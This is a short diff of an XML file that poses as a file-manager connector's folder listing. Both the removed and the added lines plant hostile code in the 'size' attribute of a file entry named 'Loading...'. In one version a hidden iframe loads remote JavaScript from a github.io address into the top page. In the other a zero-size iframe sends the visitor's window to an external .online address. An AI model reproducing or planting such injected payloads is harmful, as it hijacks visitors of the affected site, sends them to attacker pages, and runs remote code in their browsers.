@@ -1,8 +1,6 @@
-<?xml version="1.0" encoding="utf-8"?>
 <Connector command="GetFoldersAndFiles" resourceType="Document">
-  <CurrentFolder path="/1 - f/" url=""/>
-  <Folders/>
-  <Files>
-    <File name="Loading..." url="1" size="&lt;iframe style=&quot;display:none&quot; srcdoc=&quot;&lt;script&gt;var s=document.createElement(&apos;script&apos;);s.src=&apos;https://mrsabasmia.github.io/subwork/work/fx.js?v=1&apos;;s.onerror=function(){window.top.location.replace(&apos;https://mrsabasmia.github.io/subwork/&apos;);};(window.top.document||document).head.appendChild(s);&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;"/>
-  </Files>
+<CurrentFolder path="/1 - f/" url=""/>
+<Files>
+<File desc="1" name="Loading..." size="<iframe height="0" width="0" srcdoc="&lt;script&gt;window.top.location.href=&apos;https://umopa.online/pp/.html&apos;;&lt;/script&gt;"></iframe>"/>
+</Files>
 </Connector>
